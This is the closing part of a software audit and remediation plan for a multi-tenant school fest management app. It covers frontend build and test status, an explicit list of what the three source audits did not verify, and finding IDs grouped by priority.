| Build (`npm run build`, Vite) | **PASS.** Independently re-run fresh: exit code 0, `✓ built in 2.28s`, 1163 modules transformed, `manifest.json` regenerated. Prior data: 2 runs, 2.58s/2.79s, exit 0. One benign Node `[DEP0205]` deprecation notice, unrelated to app code. | `FE-BUILD-01` |
| Typecheck | None exists — no `tsconfig*.json`, no `typescript`/`vue-tsc` as a direct dependency, zero `.ts` files under `resources/` besides `playwright.config.ts`. | `FE-TYPECHECK-01` |
| Unit tests | None exist — no `test`/`vitest`/`jest` script or config, zero `*.spec.js`/`*.test.js` outside `node_modules`/`vendor`. | `FE-UNIT-01` |
| E2E | **Not executed**, by explicit task instruction — the Playwright suite needs a live dev server that could hang the session. Reported statically only: `npx playwright test --list` (metadata-only, no browser/network) enumerates 45 tests across 10 spec files/10 projects. Fest-relevant coverage spans 4 files, uniformly shallow "page loads without a 500/redirect/visible-error/layout-overflow" smoke checks — no assertion anywhere checks fee amounts, phase transitions, report values, or export contents. Most fest specs are `test.skip()`-guarded on `php artisan e2e:seed-data` having run first; absent that, they silently skip rather than validate. | `FE-E2E-01` |
| E2E orphaned spec | `tests/e2e/09-gap-completion.spec.ts` (2 tests) matches no `testMatch` pattern in any of the 10 configured projects — confirmed via the same `--list` output, which enumerates none from this file. | `FE-E2E-02` |

### 20.6 This synthesis pass's own independent spot-check

Not a re-run of Audit 3's full battery, but a direct confirmation that the sandbox still behaves as every audit in this series describes: `phpunit.xml:21,26-29` confirmed to still set `APP_ENV=testing`, `DB_CONNECTION=central`, `DB_DRIVER=sqlite`, `DB_DATABASE=:memory:`, `TENANCY_DATABASE_PER_SAHODAYA=false` — unchanged from every prior audit's own citation. `php artisan test --filter=FestFeeNoticeScenariosTest` → `{"tool":"phpunit","result":"passed","tests":7,"passed":7,"assertions":20,"duration_ms":2160}` — the repo-facts brief for this workflow stated "5/5 in 2.2s" for this same test; the file (`tests/Unit/Services/Events/FestFeeNoticeScenariosTest.php`) shows as locally modified in `git status` at the time of this writing, so the test count has grown from 5 to 7 since that brief was written — still fast, still fully passing, just a larger file than when the brief was drafted. This is reported as a small, honest discrepancy rather than silently reconciled, consistent with this document's own standard for every other citation.

---

## What this audit series did not verify

**This is a hard requirement of the audit brief, not optional politeness: this document does not claim completeness anywhere any route, report, event type, role, phase, or fee model remains unverified.** Every gap below is real, and no finding elsewhere in this document should be read as implying otherwise. Preserved per-audit (each source audit stated a different boundary, so they are kept separate rather than blended into one generic disclaimer) before the two cross-cutting items that matter most.

### From Audit 1 (features and workflows)

- **Only one tenant/school pair was ever used for every reproduction** — Malappuram Sahodaya + AMU Residential School, the only Sahodaya tenant actually seeded anywhere in this repository. No other tenant configuration (different `conduct_mode`, program set, subscription tier, region layout) was exercised live; topology-dependent findings were reproduced by *constructing* the topology in a scratch test, not finding it live.
- **No live UI walkthroughs were performed at all.** Every reproduction was an automated-test re-run or a scratch PHPUnit test against real routes/services. No manual browser session exercised any of the ~150+ Sahodaya Admin actions, ~35 School Admin fest pages, Portal role pages, or State Admin pages end-to-end. Frontend-only defects (a broken Vue computed property, a CSS bug, a client-side validation mismatch) that don't manifest in a route/service-level test would not have been caught.
- **Sahodaya Admin coverage was sampled, not exhaustive**, across ~45 controller files/150+ actions; `DATA-06`'s own recommended "full mechanical sweep" was explicitly not performed.
- **Production Postgres was never exercised live** — findings depending on Postgres-only constraints or per-tenant DB resolution (`DATA-01`'s unique index, `CERT-03`'s tenant resolution, `SA-03`'s bootstrapper behavior) are based on migration/config source reading plus Laravel/Postgres semantics, not an observed live failure.
- **No concurrency/load testing** — race-condition findings inferred from reading locking code, not from reproducing a real concurrent double-write, with the exception that Audit 3 later closed part of this gap live for `TECH-01[TechAudit]`/`TECH-03[TechAudit]` specifically.
- **No third-party security sweep** (XSS, CSRF, SQLi, dependency CVEs, secrets-in-repo) — all authorization findings are business-logic/workflow-authorization gaps found by tracing specific actor paths, not a penetration test.
- **Email/notification delivery content was not verified end-to-end** — only that the call is reached and doesn't throw (e.g. `NAV-06`), not that the resulting email renders correctly or is deliverable.
- **No performance/scale assessment** in Audit 1 itself — Audit 3 later covered this territory in its own Technical Audit section (§15 of this document).
- **The repo's other 30+ prior audit/plan docs** were skimmed only where directly relevant to a specific finding's context, not re-verified wholesale — though at least one (`Documents/Path_breaks.md`) is independently confirmed stale on specific points (`SCHREG-08`, `NAV-06`).
- **MCQ, Board Results, Training, and Membership modules are out of scope** except where Fest code directly touches them — though Audit 3 nonetheless found a real Board Results bug (`BUG-03`) as a byproduct of running the full suite, flagged to that module's owner regardless of this series' remit.
- **Of the ~10 dead/orphaned `.vue` files outside the `Pages/Admin/**` glob root, only 3 were individually investigated by name** (`UI-School EVT-03`, the `SA-05` duplicate pair) — the remaining ~8 (`Pages/School/BoardResults/PrincipalVerification/*`) were never diffed line-by-line for content drift by any of the three audits or this synthesis.

### From Audit 2 (phases and fees)

- **Vatakara: nothing** — see §17.1, restated here for completeness since it's this severe.
- **The other 4 named Sahodayas (Kochi Metro, Wayanad, Malabar, MCS) were verified against code, never against a live account.** If any is provisioned with configuration differing even slightly from this series' assumed inputs, the numbers in §7/§13 do not automatically transfer.
- **Physical multi-tenant database isolation** (`tenancy.database_per_sahodaya=true`, the actual production default) has never been exercised by any test in this repository — see §1.5/§16.5, the single most consistently-flagged gap across the series.
- **MCS's real fee figures**: only the flat ₹4,000 Level-1 base fee is real/configured anywhere; the item-to-phase mapping is empty, the item catalogue mostly reuses a different Sahodaya's catalogue wholesale, and `tenant_id` is still the literal placeholder string.
- **A handful of confirmed P0/P1 bugs (`MCS-01`, `PHASE-01`) live in code paths with zero live traffic today** — real, reproduced defects, but their "impact" describes what happens the first time a real Sahodaya uses that mechanism, not something already gone wrong in production.
- **Frontend/UI behavior was checked only where a specific finding required it** — no systematic frontend audit, no live browser-based verification, in Audit 2 specifically.

### From Audit 3 (reports, security, testing)

- **The exact root cause of `TG-08` and `TG-09`** — both reproduced live, twice independently, neither pass determined why. `TG-08` in particular should not be assumed benign — see §16.4.
- **The exact reason `SahodayaWebsiteSiteScopeTest`'s microsite-nav test fails** — advanced further than the source data (the specific missing `href` assertion is now identified, §20.2 row 5) but still not fully confirmed as intentional-refactor-vs-real-defect.
- **The exact shared-state-pollution mechanism behind `GRADE-BAND-01`'s isolation-vs-full-suite divergence** — the symptom is proven live; the source was not bisected.
- **Whether the external Chromium PDF-conversion service** (the non-dompdf production path, not present in this repository to inspect) has Malayalam fonts installed — `EXP-01` only confirms dompdf's bundled font lacks them; production correctness for the alternate path is genuinely unknown either way, not assumed-fine.
- **Whether `TG-01`'s tenant-name-uppercasing is correct product behavior** — deliberately takes no position; see §17.3.
- **Whether the `CsvExportDispatcher`-adjacent `ReportRunner`/`ErpReportQueryService` subsystem** (a separate, generic cross-domain ERP reporting layer) shares or avoids the Fest-specific memory/chunking gaps in §15 — noted as a boundary case, not separately audited end-to-end.
- **Live production behavior for anything gated behind `TENANCY_DATABASE_PER_SAHODAYA=true`** — see the cross-cutting item below.
- **Anything about report/export correctness for a real, populated multi-region or multi-Sahodaya tenant** — every multi-region/multi-phase/high-volume scenario in this document was verified via code trace, existing tests, or a freshly-built-and-deleted scratch fixture, never against a real tenant at scale, because none exists in this repository.
- **Whether the ~24 of 50 export ids not individually scratch-tested behave identically to the ones sampled** — `RPT-10`'s broad confirmatory finding is explicitly sampling-based, not exhaustive, and says so itself.

### The two items that matter most, stated once more because they recur everywhere in this document

1. **`TENANCY_DATABASE_PER_SAHODAYA=false` is forced for the entire test suite, the exact opposite of production's `true`.** All three audits independently hit this wall — `CERT-03` and `SA-03` are downgraded to `status: likely` because of it; `TIF-01` names it as its own finding, plus the documented trap that a runtime `config()` override gives false confidence without activating the real bootstrapper; `TECH-02[TechAudit]`'s cache-tenancy finding is gated behind the same flag despite being a conceptually independent mechanism. **This cannot be closed by writing more test code** — it requires either a second real database wired into the test environment, or a genuine second live production tenant. Until one of those exists, `CERT-03`, `SA-03`, and `TECH-02[TechAudit]`'s residual gap remain exactly as uncertain as stated in §9, and no future re-audit of this codebase should claim otherwise without first closing this specific infrastructure gap.
2. **Only one Sahodaya tenant (Malappuram) and one school (AMU Residential School) are seeded anywhere in this repository, and no `FestEvent` competition data is seeded at all.** Every multi-tenant, multi-region, multi-phase, or named-Sahodaya-specific claim in this entire document — including every "PASS" in §7's fee-comparison matrix — was verified against code and scratch-constructed fixtures, never against a second real tenant, because none exists. Treat every such claim as "the code, given these assumed inputs, does what's expected" and nothing stronger, until a second real tenant is provisioned and re-verified against.

### Coverage claim, stated precisely

This document catalogs 216 deduplicated findings (from 220 raw across three audits) spanning roughly 45 Sahodaya Admin controller files, ~35 School Admin fest pages, the State Admin and Portal surfaces, 50 report export ids and 22 interactive report pages, the entire fee-resolution engine, and the full backend+frontend automated test suite. It does **not** claim to have exercised every one of the ~150+ Sahodaya Admin action methods individually, every one of the 50 export ids individually, every named Sahodaya's rule against a live account, or the production database-isolation mechanism at all. Where this document is silent on something, that silence means "not covered by this series," not "verified clean."

---

## Implementation groups

Every finding ID in this document, sorted into exactly three groups as required by this task's brief. IDs already appear with full detail in §9; this is the final actionable summary.

### Immediate (P0/P1 security, billing, results, and workflow failures)

**P0 (11):** `SEC-01[Lifecycle]` (+ `RECON-04`), `EVT-01[Event setup]` (+ `FEE-01[Financial]`), `SCHREG-01`, `SCHREG-02`, `SA-01`, `SA-02`, `PHASE-01`, `MCS-01`, `FEE-01[Snapshot]`, `FEE-02[Snapshot]`, `FEE-02[Financial]`.

**P1 (38):** `CS-01`, `CS-02`, `CS-03`, `SCHREG-03`, `Event-ops EVT-01`, `Event-ops EVT-02`, `Event-ops EVT-03`, `Event-ops EVT-04`, `Marks EVT-01`, `Marks EVT-02`, `Marks EVT-04`, `QUAL-01`, `CERT-01`, `CERT-02` (+ `SEC-04[Lifecycle]`), `CERT-03`, `DATA-01`, `UI-School EVT-01`, `NAV-SEC-01`, `PUB-01`, `API-01`, `PHASE-02`, `PHASE-03` (+ `SEC-05[Lifecycle]`), `FEE-03[Financial]`, `KOCHI-02`, `MLB-01`, `FEE-03[Precedence]`, `FEE-05[Precedence]`, `FEE-07[Precedence]`, `FEE-01[Catalog]`, `RECON-01`, `RECON-02`, `SEC-01[SecAudit]`, `SEC-02[Lifecycle]`, `EXP-01`, `TECH-01[TechAudit]`, `TECH-03[TechAudit]`, `SEC-01[TestExec]`, `BUG-03`.

### Next (P2 incomplete features, reports, lifecycle consistency)

`EVT-02[Event setup]`, `EVT-03[Event setup]`, `EVT-06[Event setup]`, `CS-04`, `CS-05`, `SCHREG-04`, `Marks EVT-03`, `Marks EVT-05`, `QUAL-02`, `QUAL-03`, `QUAL-04`, `CERT-06`, `CERT-04`, `DATA-02`, `DATA-06`, `UI-School EVT-02`, `UI-School EVT-03`, `SA-03`, `SA-04`, `PUB-02`, `PUB-03`, `PHASE-04`, `PHASE-05`, `FEE-03[Catalog]`, `FEE-04[Catalog]`, `FEE-05[Catalog]`, `WYN-02`, `KOCHI-07`, `MLB-02`, `MCS-02`, `MCS-05`, `TIF-01`, `FEE-01[Precedence]`, `FEE-08[Precedence]`, `FEE-02[Hardcoded]`, `RPT-01`, `RPT-02`, `RPT-03`, `RPT-04`, `RECON-03`, `RECON-06`, `SEC-02[SecAudit]`, `SEC-06[Lifecycle]`, `SEC-03[Lifecycle]`, `EXP-02`, `EXP-03`, `EXP-04`, `EXP-05`, `EXP-06`, `TECH-04[TechAudit]`, `TECH-05[TechAudit]`, `TECH-06[TechAudit]`, `TECH-07[TechAudit]`, `TECH-08[TechAudit]`, `WYN-06`, `FEE-05[Financial]`, `FEE-06[Financial]`, `SUM-01`, `TECH-01[TestExec]`, `TG-08`, `FE-TYPECHECK-01`, `FE-UNIT-01`, `FE-E2E-01`, `GRADE-BAND-01`.

### Later (P3 usability, maintainability, architectural improvements)

`EVT-04[Event setup]`, `EVT-05[Event setup]`, `CS-06`, `CS-07`, `SCHREG-05`, `SCHREG-06`, `SCHREG-07`, `SCHREG-08`, `Event-ops EVT-05` (+ `NAV-03`), `Event-ops EVT-06`, `Marks EVT-06`, `Marks EVT-07`, `Marks EVT-08`, `QUAL-05`, `QUAL-06`, `QUAL-07`, `CERT-05`, `DATA-03`, `DATA-04`, `DATA-05`, `DATA-07`, `DATA-08`, `UI-School EVT-04`, `UI-School EVT-05`, `NAV-SEC-02`, `NAV-04`, `NAV-05`, `NAV-06`, `SA-05`, `SA-06`, `PUB-04`, `API-02`, `TEN-01`, `KOCHI-03`, `KOCHI-05`, `KOCHI-06`, `MLB-05`, `MCS-07`, `MCS-06`, `FEE-07[Catalog]`, `FEE-02[Catalog]` (+ `FEE-04[Precedence]` + `FEE-08[Snapshot]`), `FEE-06[Catalog]`, `FEE-08[Catalog]`, `FEE-01[Hardcoded]`, `FEE-03[Hardcoded]`, `FEE-04[Hardcoded]`, `RPT-05`, `RPT-06`, `RPT-07`, `RPT-08`, `RPT-09`, `RPT-10`, `RECON-05`, `SEC-03[SecAudit]`, `SEC-04[SecAudit]`, `SEC-05[SecAudit]` (+ `TECH-01[Lifecycle]`), `POS-01`, `EXP-07`, `EXP-08`, `EXP-09`, `TECH-02[TechAudit]`, `TECH-09[TechAudit]`, `TG-01`, `TG-02`, `TG-03`, `TG-04`, `TG-05`, `SEC-02[TestExec]`, `TG-06`, `TG-07`, `TG-09`, `FE-BUILD-01`, `FE-E2E-02`.

---

*End of combined audit and remediation plan. 216 deduplicated findings (220 raw) across three source audits, synthesized and cross-referenced in this document. Product decisions in §17 — Vatakara (§17.1) foremost — should be resolved before the corresponding engineering work in §18/§19 begins. The `TENANCY_DATABASE_PER_SAHODAYA` sandbox limitation (§1.5, restated in the closing unverified-areas section) should be treated as a standing infrastructure item, not a per-finding blocker, and revisited the moment a second real Sahodaya or a second physical test database becomes available.*

